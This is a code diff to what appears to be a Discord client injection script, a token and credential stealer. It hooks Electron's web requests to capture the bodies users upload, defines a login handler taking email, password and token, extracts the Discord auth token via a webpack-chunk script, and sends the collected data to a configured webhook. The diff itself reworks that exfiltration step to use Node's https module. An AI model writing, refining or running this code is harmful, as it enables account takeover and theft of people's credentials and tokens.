@@ -1,6 +1,7 @@
 const args = process.argv;
 const fs = require("fs");
 const path = require("path");
+const https = require("https");
 const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
@@ -314,13 +315,26 @@ const getBadges = (flags) => {
   return badges;
 };
 
-const hooker = (content) => {
-  execScript(`var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${config.webhook}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${JSON.stringify(content)}));
-`);
+const hooker = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL(config.webhook);
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    },
+  };
+  const req = https.request(options);
+
+  req.on("error", (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
 };
 
 const login = async (email, password, token) => {
@@ -632,13 +646,8 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsedData = details.uploadData[0].bytes;
-  let data;
-  try {
-    data = JSON.parse(Buffer.from(unparsedData).toString());
-  } catch (SyntaxError) {
-    data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()));
-  }
+  const unparsed_data = await Buffer.from(details.uploadData[0].bytes).toString();
+  const data = JSON.parse(unparsed_data);
   const token = await execScript(
     `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
   );
